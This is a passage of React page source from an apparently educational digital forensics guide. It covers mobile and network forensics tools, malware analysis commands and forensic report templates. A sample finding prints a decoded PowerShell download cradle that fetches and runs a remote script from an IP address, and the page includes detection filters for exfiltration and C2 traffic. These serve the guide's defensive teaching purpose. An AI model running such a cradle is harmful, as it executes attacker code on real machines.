                      <Grid item xs={12} sm={6} md={4} key={cat.title}>
                        <Paper sx={{ p: 2, bgcolor: themeColors.bgNested, border: `1px solid ${cat.color}30`, height: "100%" }}>
                          <Typography sx={{ color: cat.color, fontWeight: 600, mb: 1 }}>{cat.title}</Typography>
                          <List dense sx={{ py: 0 }}>
                            {cat.artifacts.map((a) => (
                              <ListItem key={a} sx={{ py: 0.25 }}>
                                <ListItemText primary={a} sx={{ "& .MuiListItemText-primary": { color: themeColors.textMuted, fontSize: "0.85rem" } }} />
                              </ListItem>
                            ))}
                          </List>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Mobile Forensics Tools</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Tool</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Platform</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Cost</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Best For</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["Cellebrite UFED", "iOS/Android", "$$$", "Physical extraction, locked devices"],
                          ["GrayKey", "iOS", "$$$", "iOS passcode bypass"],
                          ["Oxygen Forensic", "iOS/Android", "$$", "Logical extraction, cloud"],
                          ["ALEAPP", "Android", "Free", "Android artifact parsing"],
                          ["iLEAPP", "iOS", "Free", "iOS artifact parsing"],
                          ["Autopsy", "Both", "Free", "Mobile image analysis"],
                          ["libimobiledevice", "iOS", "Free", "Open source iOS tools"],
                          ["MVT", "Both", "Free", "Spyware detection (Pegasus)"],
                        ].map(([tool, platform, cost, best]) => (
                          <TableRow key={tool}>
                            <TableCell sx={{ color: "#a5b4fc", fontWeight: 500 }}>{tool}</TableCell>
                            <TableCell sx={{ color: themeColors.textMuted }}>{platform}</TableCell>
                            <TableCell sx={{ color: cost === "Free" ? "#4ade80" : themeColors.secondary }}>{cost}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{best}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>SIM Card Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# SIM card data locations:
# ICCID - SIM serial number
# IMSI - Subscriber identity
# ADN - Abbreviated Dialing Numbers (contacts)
# LND - Last Numbers Dialed
# SMS - Text messages (limited storage)

# Using SIM card reader with pySIM
pip install pysim
pySim-read.py -p 0

# Commercial tools: Cellebrite, Paraben SIM Reader
# Can recover deleted SMS from SIM

# IMSI format: MCC (country) + MNC (carrier) + MSIN (subscriber)
# Example: 310-260-1234567890
#          US  T-Mobile`}
                  />
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Network Forensics Section */}
            <Paper id="network-forensics" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <NetworkCheckIcon /> Network Forensics
              </Typography>

              <Alert severity="info" sx={{ mb: 3, bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                Network forensics analyzes network traffic to detect intrusions, data exfiltration, and reconstruct attacker activity.
              </Alert>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>PCAP Analysis with Wireshark</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Basic Wireshark filters

# HTTP traffic
http

# Specific IP
ip.addr == 192.168.1.100

# TCP port
tcp.port == 443

# DNS queries
dns

# HTTP POST requests (data exfiltration)
http.request.method == "POST"

# Follow TCP stream
Right-click packet > Follow > TCP Stream

# Export objects (files transferred)
File > Export Objects > HTTP/SMB/TFTP

# Statistics
Statistics > Conversations  # Top talkers
Statistics > Protocol Hierarchy  # Protocol breakdown
Statistics > Endpoints  # All IPs involved`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Command Line PCAP Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# tshark - Wireshark CLI
# Extract all HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Extract DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# Show conversations
tshark -r capture.pcap -q -z conv,tcp

# Extract files
tshark -r capture.pcap --export-objects http,./exported_files

# tcpdump filtering
tcpdump -r capture.pcap 'host 192.168.1.100 and port 443'

# Zeek (formerly Bro) - Network analysis framework
zeek -r capture.pcap
# Creates logs: conn.log, dns.log, http.log, ssl.log, files.log

# NetworkMiner - Extract files and images
mono NetworkMiner.exe capture.pcap

# Arkime (Moloch) - Full packet capture + search
# Enterprise-grade PCAP storage and analysis`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Detecting Malicious Traffic</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Indicator</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Wireshark Filter</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>What to Look For</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["C2 Beacons", "frame.time_delta < 1", "Regular interval connections"],
                          ["DNS Tunneling", "dns.qry.name matches \"[a-z0-9]{30,}\"", "Long encoded subdomains"],
                          ["Data Exfil", "tcp.len > 1000 && ip.dst != 10.0.0.0/8", "Large outbound transfers"],
                          ["Port Scanning", "tcp.flags.syn == 1 && tcp.flags.ack == 0", "Many SYN to different ports"],
                          ["Cleartext Creds", "http contains \"password\"", "Passwords in HTTP"],
                          ["Suspicious TLS", "ssl.handshake.extensions_server_name", "Check SNI for bad domains"],
                          ["ICMP Tunnel", "icmp.type == 8 && data.len > 64", "Data in ping packets"],
                        ].map(([indicator, filter, look]) => (
                          <TableRow key={indicator}>
                            <TableCell sx={{ color: "#f87171", fontWeight: 500 }}>{indicator}</TableCell>
                            <TableCell sx={{ color: themeColors.secondary, fontFamily: "monospace", fontSize: "0.75rem" }}>{filter}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{look}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Flow Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    NetFlow/IPFIX provides metadata about connections without full packet capture:
                  </Typography>
                  <CodeBlock
                    language="bash"
                    code={`# NetFlow data includes:
# - Source/Destination IP
# - Source/Destination Port
# - Protocol
# - Byte/Packet counts
# - Timestamps
# - TCP flags

# nfdump - NetFlow analysis
nfdump -r nfcapd.202401151200 -o extended

# Filter by IP
nfdump -r nfcapd.* 'src ip 192.168.1.100'

# Top talkers
nfdump -r nfcapd.* -s srcip -n 10

# Suspicious patterns
nfdump -r nfcapd.* -s dstport -n 20  # Find unusual ports

# SiLK (System for Internet-Level Knowledge)
rwfilter --start-date=2024/01/15 --proto=6 --dport=4444 --pass=stdout | rwcut`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Log Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Firewall logs
# Palo Alto
grep "action=drop" traffic.log | awk '{print $6}' | sort | uniq -c | sort -rn

# Cisco ASA
grep "Deny" /var/log/cisco/asa.log

# iptables
grep "DPT=22" /var/log/messages | grep "SRC=" | cut -d= -f2 | cut -d' ' -f1 | sort | uniq -c

# Proxy logs (Squid format)
cat access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20

# DNS logs
grep "NXDOMAIN" /var/log/named/queries.log  # Failed lookups (DGA?)
grep -E "[a-z0-9]{32}\." dns.log  # Long random subdomains

# Web server logs
cat access.log | grep "POST" | grep -v "200"  # Failed POST attempts
grep "union.*select" access.log  # SQL injection attempts
grep -E "(\.\./|\.\.\\\\)" access.log  # Path traversal`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Encrypted Traffic Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    Even with encryption, metadata reveals valuable information:
                  </Typography>
                  <List>
                    {[
                      ["JA3/JA3S Fingerprints", "TLS client/server fingerprints identify malware families"],
                      ["Certificate Analysis", "Self-signed certs, unusual validity periods, suspicious issuers"],
                      ["SNI (Server Name Indication)", "Destination hostname in TLS handshake"],
                      ["Traffic Patterns", "Beacon intervals, packet sizes, connection duration"],
                      ["ESNI/ECH Detection", "Encrypted SNI may indicate evasion attempts"],
                    ].map(([title, desc]) => (
                      <ListItem key={title}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                        <ListItemText primary={title} secondary={desc} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" }, "& .MuiListItemText-secondary": { color: themeColors.textMuted } }} />
                      </ListItem>
                    ))}
                  </List>
                  <CodeBlock
                    language="bash"
                    code={`# Extract JA3 fingerprints
ja3 -a capture.pcap

# Wireshark JA3 column
Edit > Preferences > Protocols > TLS > JA3

# Known malware JA3 hashes
# Cobalt Strike: 72a589da586844d7f0818ce684948eea
# Metasploit: 5d65ea3fb1d4aa7d826733d2f2cbbb1d

# TLS certificate extraction
tshark -r capture.pcap -Y "ssl.handshake.certificate" -T fields -e x509sat.uTF8String`}
                  />
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Malware Analysis Section */}
            <Paper id="malware-analysis" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <BugReportIcon /> Malware Analysis
              </Typography>

              <Alert severity="error" sx={{ mb: 3 }}>
                <strong>Safety First:</strong> Always analyze malware in an isolated environment (VM with snapshots, no network, or isolated network).
              </Alert>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Analysis Types</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={2}>
                    {[
                      { title: "Static Analysis", desc: "Examine without execution", items: ["File hashes", "Strings extraction", "PE header analysis", "Disassembly", "Signature matching"], color: "#3b82f6" },
                      { title: "Dynamic Analysis", desc: "Execute and observe", items: ["API monitoring", "Network traffic", "File system changes", "Registry modifications", "Process behavior"], color: "#ef4444" },
                      { title: "Code Analysis", desc: "Deep reverse engineering", items: ["IDA Pro / Ghidra", "Debugger stepping", "Algorithm identification", "Unpacking/deobfuscation", "Crypto analysis"], color: "#8b5cf6" },
                    ].map((type) => (
                      <Grid item xs={12} md={4} key={type.title}>
                        <Paper sx={{ p: 2, bgcolor: themeColors.bgNested, border: `1px solid ${type.color}30`, height: "100%" }}>
                          <Typography sx={{ color: type.color, fontWeight: 600, mb: 0.5 }}>{type.title}</Typography>
                          <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 1 }}>{type.desc}</Typography>
                          <List dense sx={{ py: 0 }}>
                            {type.items.map((item) => (
                              <ListItem key={item} sx={{ py: 0.25 }}>
                                <ListItemIcon sx={{ minWidth: 28 }}><CheckCircleIcon sx={{ fontSize: 16, color: type.color }} /></ListItemIcon>
                                <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0", fontSize: "0.85rem" } }} />
                              </ListItem>
                            ))}
                          </List>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Static Analysis Commands</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# File identification
file malware.exe
# PE32 executable (GUI) Intel 80386, for MS Windows

# Hash calculation
md5sum malware.exe
sha256sum malware.exe

# Strings extraction
strings -a malware.exe > strings.txt
strings -el malware.exe  # Wide strings (Unicode)

# FLOSS - Extract obfuscated strings
floss malware.exe

# PE header analysis
pefile malware.exe
readpe malware.exe

# Python pefile
python -c "import pefile; pe=pefile.PE('malware.exe'); print(pe.dump_info())"

# Imports/Exports
objdump -p malware.exe | grep -A 100 "Import"

# YARA scanning
yara -r rules/ malware.exe

# VirusTotal check (hash only!)
curl -s "https://www.virustotal.com/api/v3/files/<sha256>" -H "x-apikey: $VT_API_KEY"

# PEiD signatures (packer detection)
# DIE (Detect It Easy) for modern packer detection`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Dynamic Analysis Setup</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Sandbox Environment Setup

# 1. Create isolated VM (VMware/VirtualBox)
#    - Windows 10 with common software
#    - Disable Windows Defender
#    - Take clean snapshot

# 2. Network isolation options:
#    - Host-only networking
#    - INetSim (simulate internet services)
#    - REMnux + inetsim for fake services

# 3. Install monitoring tools:
#    - Process Monitor (Sysinternals)
#    - Process Hacker
#    - Wireshark
#    - Regshot (registry changes)
#    - API Monitor

# INetSim setup (on REMnux)
sudo inetsim --config /etc/inetsim/inetsim.conf

# FakeDNS
sudo fakedns -i eth0 -d 192.168.1.100

# Automated sandboxes:
# - Cuckoo Sandbox (open source)
# - Any.Run (online)
# - Joe Sandbox (commercial)
# - Hybrid Analysis (free online)

# Cuckoo submit
cuckoo submit malware.exe
cuckoo web  # View report`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Behavioral Indicators</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Category</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Suspicious Behavior</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Detection Method</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["Persistence", "Registry Run keys, scheduled tasks, services", "Regshot, Autoruns"],
                          ["Evasion", "VM detection, sleep calls, anti-debug", "API Monitor, debugger"],
                          ["Network", "C2 callbacks, DNS lookups, data exfil", "Wireshark, FakeNet"],
                          ["File System", "Dropping payloads, modifying system files", "Process Monitor"],
                          ["Process", "Injection, hollowing, spawning children", "Process Hacker"],
                          ["Credentials", "Keylogging, clipboard, browser data", "API Monitor"],
                          ["Crypto", "File encryption, key generation", "Entropy analysis"],
                        ].map(([cat, behavior, detection]) => (
                          <TableRow key={cat}>
                            <TableCell sx={{ color: "#f87171", fontWeight: 500 }}>{cat}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{behavior}</TableCell>
                            <TableCell sx={{ color: "#4ade80" }}>{detection}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Reverse Engineering with Ghidra</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Ghidra setup
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0_build/ghidra_11.0_PUBLIC.zip
unzip ghidra_*.zip
./ghidraRun

# Key Ghidra features:
# - Auto analysis (functions, strings, xrefs)
# - Decompiler (pseudo-C code)
# - Symbol Tree navigation
# - Cross-references (Ctrl+Shift+F)
# - Function graphs
# - Scripting (Python/Java)

# Useful scripts:
# FindCrypt - Detect crypto constants
# Yara - Run YARA rules
# VirusTotal - Check hashes

# Keyboard shortcuts:
# G - Go to address
# L - Label/rename
# ; - Add comment
# D - Disassemble
# C - Clear code

# Headless analysis
./analyzeHeadless /path/to/project ProjectName -import malware.exe -scriptPath ./scripts -postScript ExportFunctions.py`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>IOC Extraction</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Extract Indicators of Compromise

# Network IOCs
strings malware.exe | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  # IPs
strings malware.exe | grep -E "(http|https|ftp)://"  # URLs
strings malware.exe | grep -E "[a-zA-Z0-9.-]+\.(com|net|org|ru|cn)"  # Domains

# IOC extraction tools
capa malware.exe  # Capability detection
ioc_finder malware.exe  # Extract all IOC types

# capa output example:
# +------------------------+------------------------------------------+
# | ATT&CK Tactic          | ATT&CK Technique                         |
# +------------------------+------------------------------------------+
# | DEFENSE EVASION        | Obfuscated Files or Information          |
# | EXECUTION              | Command and Scripting Interpreter        |
# | PERSISTENCE            | Registry Run Keys                        |
# +------------------------+------------------------------------------+

# STIX/TAXII format export
# Use tools like OpenIOC or MISP

# Hash all extracted files
find ./extracted -type f -exec sha256sum {} \; > hashes.txt`}
                  />
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Report Writing Section */}
            <Paper id="report-writing" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <DescriptionIcon /> Forensic Report Writing
              </Typography>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: themeColors.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                  Beginner Report Template (Plain Language)
                </Typography>
                <Typography variant="body1" sx={{ color: themeColors.textMuted, lineHeight: 1.8, mb: 2 }}>
                  A good forensic report is readable by non-technical leaders and defensible in court. Write with clear
                  sentences, define terms, and avoid speculation. Every claim must be backed by evidence.
                </Typography>
                <List dense>
                  {[
                    "Executive Summary: What happened and why it matters (one page).",
                    "Scope: What systems, users, and time windows were examined.",
                    "Evidence Handling: Collection steps, hashes, and chain of custody.",
                    "Findings: Facts supported by artifacts and timelines.",
                    "Analysis: What the findings imply and how they connect.",
                    "Limitations: What could not be confirmed and why.",
                    "Appendix: Logs, hashes, screenshots, and tool output.",
                  ].map((item) => (
                    <ListItem key={item} sx={{ py: 0.25 }}>
                      <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" } }} />
                    </ListItem>
                  ))}
                </List>
                <Typography variant="body2" sx={{ color: themeColors.textMuted, lineHeight: 1.7 }}>
                  Tip: include a short "Evidence Table" listing artifact name, source path, timestamp, and why it matters.
                  This makes your report easy to validate and improves trust.
                </Typography>
              </Paper>

              <Alert severity="info" sx={{ mb: 3, bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                A forensic report may be used in court. It must be clear, accurate, and defensible.
              </Alert>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Report Structure</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <List>
                    {[
                      ["1. Executive Summary", "High-level findings for non-technical readers (1-2 pages)"],
                      ["2. Scope & Objectives", "What was investigated and why"],
                      ["3. Evidence Summary", "List of all evidence items with hashes"],
                      ["4. Methodology", "Tools and procedures used"],
                      ["5. Timeline of Events", "Chronological reconstruction"],
                      ["6. Detailed Findings", "Technical analysis with supporting evidence"],
                      ["7. Conclusions", "Summary of what was determined"],
                      ["8. Recommendations", "Remediation and prevention steps"],
                      ["9. Appendices", "Raw data, full logs, chain of custody forms"],
                    ].map(([section, desc]) => (
                      <ListItem key={section}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                        <ListItemText primary={section} secondary={desc} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" }, "& .MuiListItemText-secondary": { color: themeColors.textMuted } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Executive Summary Template</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="text"
                    code={`EXECUTIVE SUMMARY
═══════════════════════════════════════════════════════════════

Investigation Reference: IR-2024-0142
Date of Report: January 20, 2024
Examiner: [Name], [Certification]

BACKGROUND
On January 15, 2024, [Organization] detected suspicious activity on 
workstation WS-FINANCE-012. This report documents the forensic 
examination conducted to determine the nature and extent of the incident.

KEY FINDINGS
1. Initial compromise occurred via phishing email at 09:15 UTC
2. Attacker established persistence via scheduled task "WindowsUpdate"
3. Lateral movement to 3 additional systems detected
4. Approximately 2.3 GB of data exfiltrated to IP 45.33.32.156
5. No evidence of ransomware deployment

IMPACT ASSESSMENT
- Data exposed: Financial records, employee PII (estimated 1,200 records)
- Systems affected: 4 workstations, 1 file server
- Business impact: Moderate - no operational disruption

IMMEDIATE ACTIONS TAKEN
- Affected systems isolated from network
- Malicious scheduled tasks removed
- Attacker C2 IP blocked at firewall
- Password resets initiated for affected users

RECOMMENDATIONS
1. Implement email attachment sandboxing
2. Enable PowerShell script block logging
3. Deploy EDR solution with behavioral detection
4. Conduct security awareness training`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Evidence Documentation</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="text"
                    code={`EVIDENCE ITEM DOCUMENTATION
═══════════════════════════════════════════════════════════════

Evidence ID: HDD-001
Description: Seagate Barracuda 1TB Hard Drive
Serial Number: WD-WMAZA1234567
Source: Workstation WS-FINANCE-012

Collection Details:
  Date/Time: 2024-01-15 14:32:00 UTC
  Location: Finance Department, Building A, Floor 3
  Collected By: John Smith (Badge #4521)
  Witnessed By: Jane Doe (IT Manager)

Acquisition Details:
  Tool: FTK Imager 4.7.1.2
  Method: Physical disk image (E01 format)
  Write Blocker: Tableau T35689 (verified operational)

Hash Verification:
  MD5:    d41d8cd98f00b204e9800998ecf8427e
  SHA1:   da39a3ee5e6b4b0d3255bfef95601890afd80709
  SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

Image File: HDD-001.E01 (953.67 GB)
Segments: HDD-001.E01 through HDD-001.E15

Verification: Image hash verified against source on 2024-01-15 16:45 UTC`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Writing Technical Findings</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    Each finding should include: What, When, Where, How (detected), and Supporting Evidence.
                  </Typography>
                  <CodeBlock
                    language="text"
                    code={`FINDING #3: Persistence Mechanism Established
═══════════════════════════════════════════════════════════════

SUMMARY
The attacker established persistence by creating a scheduled task 
that executes a malicious PowerShell script at system startup.

DETAILS
On 2024-01-15 at 09:17:15 UTC, a scheduled task named "WindowsUpdate" 
was created on WS-FINANCE-012. Despite its name, this task is not 
legitimate and was created by the attacker.

Task Configuration:
  Name: WindowsUpdate
  Trigger: At system startup
  Action: powershell.exe -enc [Base64 encoded command]
  Created: 2024-01-15 09:17:15 UTC
  Created By: DOMAIN\\finance_user

The Base64 encoded command decodes to:
  IEX(New-Object Net.WebClient).downloadString('http://45.33.32.156/beacon.ps1')

SUPPORTING EVIDENCE
1. Windows Security Event Log (Event ID 4698)
   Location: Evidence/HDD-001/Windows/System32/winevt/Logs/Security.evtx
   Record Number: 1847293
   Screenshot: Appendix C, Figure 12

2. Scheduled Task XML
   Location: Evidence/HDD-001/Windows/System32/Tasks/WindowsUpdate
   Hash (SHA256): abc123...
   Full content: Appendix D, Listing 7

3. Memory Analysis
   Volatility output showing task in memory
   Command: vol -f memory.dmp windows.scheduled_tasks
   Output: Appendix E, Page 34

ANALYSIS
This technique is consistent with MITRE ATT&CK T1053.005 (Scheduled 
Task/Job). The use of encoded PowerShell and download cradle is 
characteristic of commodity malware and penetration testing frameworks.`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Best Practices</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={2}>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested, border: "1px solid #4ade8030" }}>
                        <Typography sx={{ color: "#4ade80", fontWeight: 600, mb: 1 }}>DO</Typography>
                        <List dense>
                          {[
                            "Use precise language and avoid ambiguity",
                            "Include hash values for all evidence",
                            "Cite specific sources for every finding",
                            "Use UTC timestamps consistently",
                            "Include screenshots and log excerpts",
                            "Explain technical terms for non-technical readers",
                            "State limitations and what couldn't be determined",
                            "Have another examiner peer review",
                          ].map((item) => (
                            <ListItem key={item} sx={{ py: 0.25 }}>
                              <ListItemIcon sx={{ minWidth: 28 }}><CheckCircleIcon sx={{ fontSize: 16, color: "#4ade80" }} /></ListItemIcon>
                              <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0", fontSize: "0.85rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested, border: "1px solid #ef444430" }}>
                        <Typography sx={{ color: "#ef4444", fontWeight: 600, mb: 1 }}>DON'T</Typography>
                        <List dense>
                          {[
                            "Make conclusions without evidence",
                            "Use vague terms like 'appears to' or 'seems'",
